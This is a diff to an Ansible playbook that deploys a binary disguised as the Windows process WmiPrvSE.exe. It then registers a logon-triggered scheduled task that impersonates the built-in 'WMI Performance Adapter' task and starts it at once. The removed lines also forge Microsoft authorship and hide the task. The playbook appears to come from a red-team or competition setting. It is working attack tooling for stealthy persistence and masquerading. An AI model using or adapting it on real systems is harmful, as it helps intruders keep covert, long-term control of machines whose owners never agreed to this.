@@ -1,5 +1,5 @@
 ---
-- name: Deploy and Enroll System Management Service
+- name: Deploy and Create Persistent Task
   hosts: windows
   gather_facts: no
   vars:
@@ -19,69 +19,16 @@
         src: "files/proper.exe"
         dest: "{{ target_dir }}\\WmiPrvSE.exe"
 
-    - name: Install Hidden Persistent Task
+    - name: Create and Start the persistent task
       ansible.windows.win_shell: |
-        $stateFile = "C:\Users\charliebrown.TEAM1PEANUTS.000\AppData\Roaming\gundo\state.json"
+        $taskAction = New-ScheduledTaskAction -Execute "{{ target_dir }}\WmiPrvSE.exe" -Argument "client"
+        $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User "TEAM1\charliebrown"
+        $taskPrincipal = New-ScheduledTaskPrincipal -UserId "TEAM1\charliebrown" -LogonType Interactive -RunLevel LeastPrivilege
         
-        if (Test-Path $stateFile) {
-            $taskXml = @'
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Author>Microsoft Corporation</Author>
-    <Description>WMI Performance Adapter</Description>
-  </RegistrationInfo>
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-      <UserId>TEAM1\charliebrown</UserId>
-    </LogonTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>TEAM1\charliebrown</UserId>
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>LeastPrivilege</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>false</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>false</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>{{ target_dir }}\WmiPrvSE.exe</Command>
-      <Arguments>client</Arguments>
-    </Exec>
-  </Actions>
-</Task>
-'@
-            $xmlPath = "$env:TEMP\wmi_task.xml"
-            $taskXml | Out-File -FilePath $xmlPath -Encoding Unicode
-            schtasks.exe /Create /TN "\Microsoft\Windows\WMI\WMI Performance Adapter" /XML $xmlPath /F
-            Remove-Item $xmlPath -Force
-            schtasks.exe /Run /TN "\Microsoft\Windows\WMI\WMI Performance Adapter"
-            Write-Host "[+] Hidden task installed and started."
-        } else {
-            Write-Host "[-] Still cannot find state.json."
-        }
-      register: launch_result
-
-    - name: Show result
-      debug:
-        msg: "{{ launch_result.stdout }}"
+        
+        Register-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath "\Microsoft\Windows\WMI\" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Force
+        
+        
+        Start-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath "\Microsoft\Windows\WMI\"
+        
+        Write-Host "[+] Task created and started immediately."
